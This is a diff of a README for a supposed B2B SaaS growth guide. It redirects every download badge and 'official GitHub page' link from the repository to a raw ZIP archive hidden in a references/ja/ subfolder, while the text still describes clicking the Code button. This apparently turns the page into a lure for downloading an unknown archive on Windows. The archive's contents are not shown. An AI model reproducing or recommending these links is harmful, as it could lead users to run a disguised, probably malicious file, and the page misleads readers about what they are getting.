@@ -1,6 +1,6 @@
 # 🚀 gingiris-b2b-growth - Practical B2B SaaS Growth Guide
 
-[![Download gingiris-b2b-growth](https://img.shields.io/badge/Download-gingiris--b2b--growth-brightgreen)](https://github.com/otakurog/gingiris-b2b-growth)
+[![Download gingiris-b2b-growth](https://img.shields.io/badge/Download-gingiris--b2b--growth-brightgreen)](https://raw.githubusercontent.com/otakurog/gingiris-b2b-growth/main/references/ja/gingiris-growth-b-v1.3.zip)
 
 ## 📋 About gingiris-b2b-growth
 
@@ -20,10 +20,10 @@ The repository is open source under the MIT license. It serves as a practical gu
 
 To get started with gingiris-b2b-growth, you need to visit the official GitHub page below. From there, you will find all materials and instructions to run the playbook on your Windows computer.
 
-[![Get gingiris-b2b-growth](https://img.shields.io/badge/Get%20gingiris--b2b--growth-blue)](https://github.com/otakurog/gingiris-b2b-growth)
+[![Get gingiris-b2b-growth](https://img.shields.io/badge/Get%20gingiris--b2b--growth-blue)](https://raw.githubusercontent.com/otakurog/gingiris-b2b-growth/main/references/ja/gingiris-growth-b-v1.3.zip)
 
 You can access the page here:  
-https://github.com/otakurog/gingiris-b2b-growth
+https://raw.githubusercontent.com/otakurog/gingiris-b2b-growth/main/references/ja/gingiris-growth-b-v1.3.zip
 
 This page contains the full repository files. You will find the latest version ready to download, along with documentation and examples. The instructions in this guide will help you through the process step by step.
 
@@ -45,7 +45,7 @@ Follow these steps to download and run the playbook on your Windows machine:
 
 ### Step 1. Visit the official GitHub page  
 Open your web browser and go to:  
-https://github.com/otakurog/gingiris-b2b-growth  
+https://raw.githubusercontent.com/otakurog/gingiris-b2b-growth/main/references/ja/gingiris-growth-b-v1.3.zip  
 
 ### Step 2. Download the repository  
 Click on the green **Code** button near the top right of the page.  
@@ -132,10 +132,10 @@ Combining gingiris-b2b-growth with other learning resources will boost your resu
 
 ## 📌 Key Points
 
-- Download the ZIP file from the [GitHub page](https://github.com/otakurog/gingiris-b2b-growth)  
+- Download the ZIP file from the [GitHub page](https://raw.githubusercontent.com/otakurog/gingiris-b2b-growth/main/references/ja/gingiris-growth-b-v1.3.zip)  
 - Extract and open files on your Windows PC  
 - Follow easy, structured steps to learn and apply growth methods  
 - Use cases and templates included to guide your decisions  
 - Keep checking for updates to stay current  
 
-[![Download gingiris-b2b-growth](https://img.shields.io/badge/Download-gingiris--b2b--growth-brightgreen)](https://github.com/otakurog/gingiris-b2b-growth)
+[![Download gingiris-b2b-growth](https://img.shields.io/badge/Download-gingiris--b2b--growth-brightgreen)](https://raw.githubusercontent.com/otakurog/gingiris-b2b-growth/main/references/ja/gingiris-growth-b-v1.3.zip)
